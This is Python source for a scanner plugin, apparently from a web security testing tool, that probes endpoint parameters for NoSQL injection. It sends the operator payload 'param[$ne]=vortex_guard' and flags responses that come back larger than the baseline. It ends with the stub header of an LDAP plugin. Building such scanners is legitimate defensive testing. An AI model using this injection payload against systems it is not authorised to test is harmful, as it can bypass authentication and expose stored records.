from .base import BasePlugin
import re
import json
import base64

class NoSQLiPlugin(BasePlugin):
    """
    NoSQL Injection (MongoDB/CouchDB).
    Attempts to inject NoSQL operators ($ne, $gt) to bypass logic.
    """
    name = "NoSQL Injection"

    def should_run(self, endpoint):
        # Most effective on JSON endpoints or parameters handled as object keys
        return len(endpoint.params) > 0

    def run(self, http, endpoint, analyzer, evidence):
        try:
            base_params = {p['name']: p['value'] for p in endpoint.params}
            baseline = self._make_request(http, endpoint, base_params)
            if not baseline: return
        except: return

        # Payload: {"$ne": "vortex_impossible_value"}
        # Logic: If the query becomes "WHERE param != 'impossible'", it usually returns TRUE (all records)
        # causing a massive response difference compared to a standard baseline.

        for param in endpoint.params:
            try:
                fuzzed = base_params.copy()
                # Injecting the operator as a dictionary (requires library support to serialize to URL/JSON correctly)
                # For basic URL params, we try array syntax: param[$ne]=...
                
                # Strategy 1: URL Parameter Array Syntax (PHP/Express standard)
                # param=val -> param[$ne]=random
                # We simulate this by modifying the parameter name itself in the request
                
                # This is tricky with the current simple HTTP client, so we construct raw dict
                # Assuming the HTTP client handles dict params:
                fuzzed[f"{param['name']}[$ne]"] = "vortex_guard"
                del fuzzed[param['name']] # Remove original
                
                resp = self._make_request(http, endpoint, fuzzed)
                if not resp: continue
                
                diff = analyzer.diff(baseline, resp)
                
                # If we get MORE data (length increase) or a 200 OK where we expected 401/403
                if diff["length_changed"] and len(resp.text) > len(baseline.text):
                     evidence.add(
                        plugin=self.name,
                        endpoint=endpoint.url,
                        parameter=param['name'],
                        payload=f"{param['name']}[$ne]=vortex_guard",
                        evidence="Response size increased significantly with NoSQL operator",
                        confidence="MEDIUM",
                        diff=diff
                    )

            except: continue

    def _make_request(self, http, endpoint, params):
        if endpoint.method == "POST":
            return http.request("POST", endpoint.url, data=params)
        return http.request("GET", endpoint.url, params=params)


# filename: plugins/ldap.py
from .base import BasePlugin